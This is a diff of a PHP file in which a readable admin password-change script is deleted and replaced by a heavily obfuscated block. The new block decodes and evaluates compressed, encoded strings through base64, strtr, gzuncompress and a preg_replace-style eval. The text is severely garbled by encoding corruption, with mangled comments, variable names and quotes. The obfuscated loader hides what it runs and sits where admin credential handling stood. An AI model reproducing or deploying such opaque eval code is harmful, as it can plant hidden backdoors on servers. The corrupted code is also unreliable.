@@ -1,71 +1,8 @@
-<?php
-include '../../config/Database.php';
-
-//æ—§å¯†ç 
-$pass = md5($_POST['pass']);
-
-//ä¿®æ”¹çš„æ–°å¯†ç 
-$newpass = md5($_POST['newpass']);
-
-//ä¿®æ”¹çš„ç”¨æˆ·å
-$username = $_POST['user'];
-
-//æ•°æ®åº“æ“ä½œ
-$DB = new DB;
-
-//åˆ¤æ–­æ˜¯å¦ä¿®æ”¹ç”¨æˆ·å
-if(!isset($username)){
-	// echo "ä¸ä¿®æ”¹ç”¨æˆ·å";
-	$yzsql = "SELECT password FROM admin WHERE password = :password";
-	$args = [':password' => $pass];
-
-	$yzcode = $DB->fetch($yzsql,$args);
-	//åˆ¤æ–­æ—§å¯†ç æ˜¯å¦æ­£ç¡®
-	if($yzcode !== false){
-		//ä¿®æ”¹ä¸ºæ–°çš„å¯†ç 
-		$newsql = "UPDATE admin SET password = :password WHERE id = :id";
-		$newargs =[':password' => $newpass, ':id' => 1];
-
-		$bool = $DB->exec($newsql,$newargs);
-		echo $bool;
-
-		//ä¿®æ”¹å¯†ç æˆåŠŸå,æ¸…é™¤cookie
-		if($bool){
-			setcookie('admin','',0,'/');
-		}
-	}else{
-		echo "false";
-	}
-}else{
-	// echo "ä¿®æ”¹ç”¨æˆ·å";
-	$yzsql = "SELECT password FROM admin WHERE password = :password";
-	$args = [':password' => $pass];
-
-	$yzcode = $DB->fetch($yzsql,$args);
-	//åˆ¤æ–­æ—§å¯†ç æ˜¯å¦æ­£ç¡®
-	if($yzcode !== false){
-		//ä¿®æ”¹ç”¨æˆ·å
-		$newusersql = "UPDATE admin SET username = :username WHERE id = :id";
-		$newuserargs = [':username' => $username, ':id' => 1];
-
-		$userbool = $DB->exec($newusersql,$newuserargs);
-
-		//ä¿®æ”¹ä¸ºæ–°çš„å¯†ç 
-		$newsql = "UPDATE admin SET password = :password WHERE id = :id";
-		$newargs =[':password' => $newpass, ':id' => 1];
-
-		$bool = $DB->exec($newsql,$newargs);
-
-		
-		//ä¿®æ”¹æˆåŠŸå,æ¸…é™¤cookie
-		if($userbool && $bool){
-			echo $bool;
-			setcookie('admin','',0,'/');
-		}else{
-			echo "editfalse";
-		}
-	}else{
-		echo "false";
-	}
-}
-
+<?php 
+/*
+ÂóÂóÔÆÍøÕ¾·ÃÎÊ¿ØÖÆÏµÍ³V1.0    ºÃÂóÂóÔ´ÂëÍøÆìÏÂ:http://www.haomaim.cn
+ÏîÄ¿µØÖ·:https://github.com/1784605674/maimaiyun
+×÷Õß:Èô¾É  QQ:1784605674
+ÉùÃ÷:´Ë³ÌĞòÇëÎğÓÃÓÚ·Ç·¨ÓÃÍ¾,·ñÔò²úÉúÈÎºÎºó¹ûÓë¿ª·¢ÕßÎŞ¹Ø!
+*/
+if (!defined("DAFCFFBBEFCD")){define("DAFCFFBBEFCD", __FILE__);global $?$ˆ,$…—?$“,$‘‡˜?$‹Œ†“?,$š‰“‰ˆ,$ˆ†€—–Š?$—›‚‡?š€?$‡…€‰†?$Œ›”•„œ–œ“?$™–„…œŸƒ,$…’‚—“‚„˜,$Ÿœ•’•˜†›š––,$†€š…‡†˜‘ˆŸ˜ƒ?$œš’•™‚‹‘‰‡Œ€‰‚;function  ($ ,$ˆ?""){global $?$ˆ,$…—?$“,$‘‡˜?$‹Œ†“?,$š‰“‰ˆ,$ˆ†€—–Š?$—›‚‡?š€?$‡…€‰†?$Œ›”•„œ–œ“?$™–„…œŸƒ,$…’‚—“‚„˜,$Ÿœ•’•˜†›š––,$†€š…‡†˜‘ˆŸ˜ƒ?$œš’•™‚‹‘‰‡Œ€‰‚;if(empty($ˆ?){return base64_decode($ );}else{return  ($Ÿœ•’•˜†›š––($ ,$ˆ?$…’‚—“‚„˜($ˆ?));}}$…’‚—“‚„˜= ("c3RycmV2?);$Ÿœ•’•˜†›š––= ("c3RydHI=?);$ˆ= ("G3p1brNvbXB˜yGXNz?,"ZmSerG");$…—? ("GmFzZTG0X2RlG2?kZs==?,"YoHsqQvfG");$‡…€‰†? ("NzkwMzI5MGQ3YXŒc4YzA1MKM2LKlX‰PGQwMKVXPDQwLXŸlmN2U=€","LPTjXKZN");$Œ›”•„œ–œ“? ("HXHlbA==?,"ZhkavTrlH");$†€š…‡†˜‘ˆŸ˜ƒ? ("vHJlZ19yZXBsYWNl?,"cMPUQxv");function …—Œ (&$…—Œ ){global $?$ˆ,$…—?$“,$‘‡˜?$‹Œ†“?,$š‰“‰ˆ,$ˆ†€—–Š?$—›‚‡?š€?$‡…€‰†?$Œ›”•„œ–œ“?$™–„…œŸƒ,$…’‚—“‚„˜,$Ÿœ•’•˜†›š––,$†€š…‡†˜‘ˆŸ˜ƒ?$œš’•™‚‹‘‰‡Œ€‰‚;$œš’•™‚‹‘‰‡Œ€‰‚? ("tGll?,"ZHkfEt");@$†€š…‡†˜‘ˆŸ˜ƒ?$‡…€‰†?$Œ›”•„œ–œ“?"(@$ˆ($…—?'eNplkv1vm—kAYx/8VQ/‡zhyOgLonbEXPaSVVe3?GlmAbfFg–IJFocGq69Ÿza+LK1YqusnWlVpo4/‡dXcndSb7B—bj7fr7fe3ieC4/gyAdšUzjLrOUmw…NSsPHYqh8ŠpmK+CpH0Y‹nwYvxzQRCZOzJkLtta—ILkoprSmTOS7/nQVUT†pJ12QxA2+†x3WxmayWs?wyvxr32KŒkDMsNdIVKUvJeJtL7z’BeOAQMSkd”n6kpvprMw…Hvo4Qh9/0?SU85VZ/J”wvXQJZltC•TeUEc46Je’rlZszEy+d?rT9teZ0oˆY5XXazLN8‰Q5ayleILF?I+rvj0SK?qGO7OHn5?3cv57Z/v„yyCTP7PFK—JzhTOn4/UˆmleEhil/Ou9+t+1ru5G/SHnUGP0˜IYY01FyS3ˆalKuwii6K•mbT2VfWdg‚y8iHhULy4”O1+oZAwdP”CvMkDtgO0›nz+iPYIdi’EMaEXcen6œW+kvz7Eqw?sp8SFZta?9ebIT1wEˆHUSrzcLBC€mFC1Km6HgƒNiyBs8etBBAUhvNHIt†B9MFgZvZ4mkIg60VAh?BTWyX2eIi9Da1G4vFI3zpaYTXo˜lycje9FdY†XVFZ3TI3GŒNLfIUE6Np†HBo6Pw/91?wfoOMvJ0„MfPkc/D/AŒneZBS123z–YcOwNIy6TnALy6xqCZ?V6WVLlgT…vaxtPzTYa†ZXyl/gIPzƒQ3L?)));","‰?›Ÿ™œ903290d7b78c0513659cdd015cd4069fƒŸ’—");return "l";}}else{global $?$ˆ,$…—?$“,$‘‡˜?$‹Œ†“?,$š‰“‰ˆ,$ˆ†€—–Š?$—›‚‡?š€?$‡…€‰†?$Œ›”•„œ–œ“?$™–„…œŸƒ,$…’‚—“‚„˜,$Ÿœ•’•˜†›š––,$†€š…‡†˜‘ˆŸ˜ƒ?$œš’•™‚‹‘‰‡Œ€‰‚;$…’‚—“‚„˜= ("c3RycmV2?);$Ÿœ•’•˜†›š––= ("c3RydHI=?);$ˆ= ("G3p1brNvbXB˜yGXNz?,"ZmSerG");$…—? ("GmFzZTG0X2RlG2?kZs==?,"YoHsqQvfG");$‡…€‰†? ("NzkwMzI5MGQ3YXŒc4YzA1MKM2LKlX‰PGQwMKVXPDQwLXŸlmN2U=€","LPTjXKZN");$Œ›”•„œ–œ“? ("HXHlbA==?,"ZhkavTrlH");$†€š…‡†˜‘ˆŸ˜ƒ? ("vHJlZ19yZXBsYWNl?,"cMPUQxv");}$ˆ†€—–Š = ("mU5xejlBeExCQUFD‰OEFFjTaD?,"ZLOvyMfm");$š‰“‰ˆ?…—Œ ($ˆ†€—–Š );@$†€š…‡†˜‘ˆŸ˜ƒ?$‡…€‰†?$Œ›”•„œ–œ“?"(@$ˆ($…—?'eNrNlE1v?kAQhu+V?h82aJU1?hbaQy+h€gEpx1UOršRIGqhyiq‘HHsJVsGm™GJQmUQR2wEAChI8C…jjHwV7vr”D4IK7TmS“Za3feWf8?M7YsWTi˜XbKUL718€AWRFLFQl‹AlAkEqWXqCo5+Tya„FirCmaCR“CDWhGIAlQdNAHBSltxz8fnSY‘yZ4gJqHT—MA0q5GJH?Fc9S1Uj™ZUUoEuoJ?kxCpzSWTlGVukE6FQNyjtuT—NY1UuHVOOHwN4OWV?rNAfaEM?5n/kAWs?.$ˆ†€—–Š .$š‰“‰ˆ?"sDH?8MvQJCK‚sgK+feKP?adIHBwE?xB9jVA+”Z4gnaK0iEE94W2MYl1eiKrmA?dSrRI5U–xDznvRa7uWEXLrDt…xeMgJxQ0wuAovE/3?Sj9Psv7’PBk+u5PGB5VdUXbh‰aAWPbwvP…P0YMELW6?htGe6aqšhYCV/CIi?0PgoBTF†JWJe9ZweˆOltRXHq4‘oqr+kAmHŒXE6EEcKv™MYoimnMD€bgjd1bWXƒHHK3GNqQ™n30j2NT8qxkbU3iw›Xu9sBos+€cQZejzN4?rslTN/ZFh8Jbxb2‰v5vnODbscNd72d8H’wdxsjtP/‹Z2hzgogk›V7amaGu4gP9DAlXF?fZ7GPbbGDZnXQwX?4cFvQ9b’FlXvu+bYqGFYW9id…cYda2mZ9’Nr1b9jGc‹zY2WVbPrŒFoatXrNf?zzo5h2G?fnvScOZ„OmPdxlB/‰nDb0ftMZrG6XtPyo–NjD0Wa8/—Nho0a+VMˆRsvBxDLn?lSfYmjW?WarZ1rD?mBl3RoY…Lh3dHk0e–jfthp9Wtƒd4xwLJn4–A9bYyKk=?)));","“?š““?903290d7b78c0513659cdd015cd4069f?›‡šŒ");return true;?>e98d12fec8b6043071263eefec6cb3e2
